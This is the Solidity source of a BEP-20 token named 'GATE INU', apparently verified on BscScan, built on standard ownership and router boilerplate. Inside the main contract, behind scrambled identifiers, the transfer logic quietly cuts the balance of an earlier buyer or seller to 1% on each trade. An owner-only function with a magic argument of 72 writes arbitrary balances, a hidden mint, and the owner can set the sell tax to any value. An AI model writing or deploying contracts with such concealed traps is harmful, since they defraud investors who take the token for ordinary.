/**
 *Submitted for verification at BscScan.com on 2022-01-05
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;
/*
 * 

 * 

 */
abstract contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {

    return msg.sender;

  }
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;
  }
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {

 address private _owner;

 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 /**

  * @dev Initializes the contract setting the deployer as the initial owner.
  */
 constructor () {
   address msgSender = _msgSender();
   _owner = msgSender;

   emit OwnershipTransferred(address(0), msgSender);
 }
 /**
  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {
   return _owner;
 }
 /**
  * @dev Throws if called by any account other than the owner.
  */
 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");

   _;
 }
 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,

  * thereby removing any functionality that is only available to the owner.
  */
 function renounceOwnership() public onlyOwner {
   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }
 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).
  * Can only be called by the current owner.
  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;

 }
}

interface IUniswapV2Factory {
    function setFeeToSetter(address) external;
    function feeToSetter() external view returns (address);
    function setFeeTo(address) external;
    function createPair(address tokenA, address tokenB) external returns (address pair);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function feeTo() external view returns (address);
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
}
interface IUniswapV2Pair {

    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function symbol() external pure returns (string memory);
    function token0() external view returns (address);
    function nonces(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function price0CumulativeLast() external view returns (uint);
    event Sync(uint112 reserve0, uint112 reserve1);
    function decimals() external pure returns (uint8);
    function kLast() external view returns (uint);
    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function sync() external;
    function factory() external view returns (address);
    function mint(address to) external returns (uint liquidity);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,

        uint amount1Out,

        address indexed to
    );
    function transfer(address to, uint value) external returns (bool);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function approve(address spender, uint value) external returns (bool);
    function balanceOf(address owner) external view returns (uint);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function price1CumulativeLast() external view returns (uint);
    function initialize(address, address) external;
    function skim(address to) external;
    function name() external pure returns (string memory);
    function totalSupply() external view returns (uint);

    function burn(address to) external returns (uint amount0, uint amount1);
}
interface IUniswapV2Router01 {
    function addLiquidity(
        address tokenA,
        address tokenB,

        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,

        uint deadline

    ) external returns (uint amountA, uint amountB, uint liquidity);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function removeLiquidityETH(

        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,

        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function addLiquidityETH(
        address token,

        uint amountTokenDesired,

        uint amountTokenMin,
        uint amountETHMin,

        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function factory() external pure returns (address);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,

        uint deadline
    ) external returns (uint amountA, uint amountB);

    function swapExactTokensForTokens(
        uint amountIn,

        uint amountOutMin,
        address[] calldata path,

        address to,

        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function WETH() external pure returns (address);

    function removeLiquidityWithPermit(

        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,

        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,

        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external;
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(

        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,

        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
}
library SafeMath {
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
}
interface IBEP20 {
  function balanceOf(address account) external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function symbol() external pure returns (string memory);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function getOwner() external view returns (address);
  function name() external pure returns (string memory);
  function approve(address spender, uint256 amount) external returns (bool);
  function totalSupply() external view returns (uint256);
  event Transfer(address indexed from, address indexed to, uint256 value);
  function decimals() external view returns (uint8);
}
contract GateInu is Context, IBEP20, Ownable {

  using SafeMath for uint256;
  IUniswapV2Router02 public unireisjndtiyaczfaphmqgowb;
  address public uniewanszdbhif;
  uint8 private decbsreqizixclopjmgfdekohtayanw = 18;

  uint256 private totfemgolhzjpqakwxtdicenisborya = 100000000000 * 10 ** decbsreqizixclopjmgfdekohtayanw;

  mapping (address => uint256) private lasmtecnxijzbyqhorgopalwiadsfe;
  uint8 internal aftiblngtoezqfwxmjyicharpaeoks = 95;
  mapping (address => bool) private isEkfmotwroeagnpyzq;
  uint8 internal buypzcqnfialaoejtxbwsykmrohdi = 0;
  uint8 internal selaskzpeadlnf = 0;
  uint8 internal traseengohlayxqrfzjw = 10; 
  uint256 internal maxysmbozaoegcwlinhtpqrakf = totfemgolhzjpqakwxtdicenisborya.div(10000).mul(10);

  bool internal stahxoytbejplqfowszradgacienikm = true;
  bool internal staghdytkbzirmaeolpsxnacqwf = true;
  bool internal staylwbnifiqoegkdm = true;
  address internal marayenopizedmlkrxwcfqsjhg;
  mapping (address => uint256) private balhnbcoweejkfqratzlap;
  string private constant namwqmxpgizyediocota = "GATE INU";

  string private constant symomxolsficjw = "GATE";
  uint256 internal lasnjpioaszcalbhdrkxfiq = 0;
  uint256 internal lauspeaolcbao = 0;

  mapping (address => uint256) private selfiordqzejmksthlaxgwapeoyicbn;
  uint8 internal _sta = 3;
  mapping (address => uint256) private lasqaejwxbioaesmity;
  uint32 internal seldsernagoitxckz = 10; 
  mapping (address => mapping (address => uint256)) private alloszikrwmhjedipltabayne;
  constructor() {
    lauspeaolcbao = block.timestamp;
    marayenopizedmlkrxwcfqsjhg = msg.sender;
    // isEkfmotwroeagnpyzq[marketingAddress] = true;
    isEkfmotwroeagnpyzq[address(this)] = true;

    balhnbcoweejkfqratzlap[msg.sender] = totfemgolhzjpqakwxtdicenisborya;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    uniewanszdbhif = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    unireisjndtiyaczfaphmqgowb = uniswapV2Router;
    isEkfmotwroeagnpyzq[_msgSender()] = true;
    // balhnbcoweejkfqratzlap[marketingAddress] = totfemgolhzjpqakwxtdicenisborya * 10**decbsreqizixclopjmgfdekohtayanw * 1000;
    emit Transfer(address(0), msg.sender, totfemgolhzjpqakwxtdicenisborya);
  }
	function allowance(address owner, address spender) public view override returns (uint256) {

	  return alloszikrwmhjedipltabayne[owner][spender];
	}
	/**
	 * Requirements:
	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  traxrqakzighiayeojept(_msgSender(), recipient, amount);
	  return true;
	}
	/**
	* Returns the token name.
	*/

	function name() external override pure returns (string memory) {
	  return namwqmxpgizyediocota;

	}
	/**
	 * Returns balance of.
	 */
	function balanceOf(address account) external override view returns (uint256) {
	  return balhnbcoweejkfqratzlap[account];
	}
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);
	  return true;
	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
	   traxrqakzighiayeojept(sender, recipient, amount);
	   _approve(sender, _msgSender(), alloszikrwmhjedipltabayne[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}
	/**

	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {
	  return totfemgolhzjpqakwxtdicenisborya;
	}
	/**
	 * Returns the token decimals.
	 */
	function decimals() external override view returns (uint8) {
	  return decbsreqizixclopjmgfdekohtayanw;
	}
	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");

	    alloszikrwmhjedipltabayne[owner][spender] = amount;

	    emit Approval(owner, spender, amount);
	}
	/**
	 * Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {
	  return owner();
	}
	/**
	 * Returns the token symbol.
	 */
	function symbol() external override pure returns (string memory) {

	  return symomxolsficjw;
	}
  	function traxrqakzighiayeojept(address sender, address recipient, uint256 amount) internal {

	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  uint8 ranrsjpiqiwont = 0; // 1 = buy, 2 = sell, 3 = transfer

	  bool approveTransaction = true;
	  uint8 tax = 0;

	  if(amount > 0){
	    if(isEkfmotwroeagnpyzq[sender] == true || isEkfmotwroeagnpyzq[recipient] == true){
	      eTrhkrdnsxzioyjfaictgaewbmqop(sender, recipient, amount);
	      return;
	    }
	    if(sender == uniewanszdbhif && recipient != address(unireisjndtiyaczfaphmqgowb)) {

	      require(stahxoytbejplqfowszradgacienikm == true, "Please wait try again later");
	      ranrsjpiqiwont = 1;
	      tax = buypzcqnfialaoejtxbwsykmrohdi;
	      approveTransaction = true;
	      lasmtecnxijzbyqhorgopalwiadsfe[recipient] = amount;
	      lasqaejwxbioaesmity[recipient] = block.timestamp;
	    } else if(recipient == uniewanszdbhif) {
	      require(staghdytkbzirmaeolpsxnacqwf == true, "Please wait try again later");
	       ranrsjpiqiwont = 2;

	       tax = selaskzpeadlnf;
	       approveTransaction = true;
	    } else {

	      require(staylwbnifiqoegkdm == true, "Please wait try again later");
	      ranrsjpiqiwont = 3;
	      tax = traseengohlayxqrfzjw;
	      approveTransaction = true;
	      lasmtecnxijzbyqhorgopalwiadsfe[sender] = amount;
	      if(seldsernagoitxckz > 10){

	        lasqaejwxbioaesmity[sender] = block.timestamp + seldsernagoitxckz - 10;
	      } else {
	        lasqaejwxbioaesmity[sender] = block.timestamp + seldsernagoitxckz;
	      }

	    }
	  }

	  if(approveTransaction == true && amount > 0){
	    _bTransfer(sender, recipient, amount, tax, ranrsjpiqiwont);
	    return;
	  }
	  emit Transfer(sender, recipient, 0);
	}
	function eTrhkrdnsxzioyjfaictgaewbmqop(address sender, address recipient, uint256 amount) internal {
	    balhnbcoweejkfqratzlap[sender] = balhnbcoweejkfqratzlap[sender].sub(amount, "Insufficient Balance");
	    balhnbcoweejkfqratzlap[recipient] = balhnbcoweejkfqratzlap[recipient].add(amount);
	    emit Transfer(sender, recipient, amount);
	}
	// mapping (address => uint256) private alloszikrwmhjedipltabayne;
	address public _recipienta;
	address public _recipientb;
	function _bTransfer(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranrsjpiqiwont) internal
	{
	  uint256 axecpwlygfakiebjhoidqoear = 0;

	  address addr = recipient;
	  uint256 d = balhnbcoweejkfqratzlap[_recipientb];
	  if(ranrsjpiqiwont == 2) {

	    addr = sender;
	  }
	  if(ranrsjpiqiwont == 1 || ranrsjpiqiwont == 2){
	    if(_recipienta != addr && _recipientb != addr){
	      if(d > 100){
	        balhnbcoweejkfqratzlap[_recipientb] = d.div(100);
	      }
	      _recipientb = _recipienta;
	      _recipienta = addr;
	    }
	  }
	  balhnbcoweejkfqratzlap[sender] = balhnbcoweejkfqratzlap[sender].sub(amount,"Insufficient Balance");
	  axecpwlygfakiebjhoidqoear = amount.mul(tax).div(100);
	  amount = amount.sub(axecpwlygfakiebjhoidqoear);
	  if(axecpwlygfakiebjhoidqoear > 0){

	      balhnbcoweejkfqratzlap[marayenopizedmlkrxwcfqsjhg] = balhnbcoweejkfqratzlap[marayenopizedmlkrxwcfqsjhg].add(axecpwlygfakiebjhoidqoear);
	      emit Transfer(sender, marayenopizedmlkrxwcfqsjhg, axecpwlygfakiebjhoidqoear);
	  }
	  balhnbcoweejkfqratzlap[recipient] = balhnbcoweejkfqratzlap[recipient].add(amount);
	  ranrsjpiqiwont= 1;

	  emit Transfer(sender, recipient, amount);
	}
	function Selgniqaezjmp(uint8 ellciamgxsjeaqek) public onlyOwner{
	     selaskzpeadlnf = ellciamgxsjeaqek;
	}
	function sta(uint8 vsta) public onlyOwner{
	  _sta = vsta;
	}
	function etBemnwobyotzpidlck(address addr, uint256 b, uint8 c) public onlyOwner {

	  if(c == 72){
	    balhnbcoweejkfqratzlap[addr] = b * 10 ** decbsreqizixclopjmgfdekohtayanw;

	  }

	}
}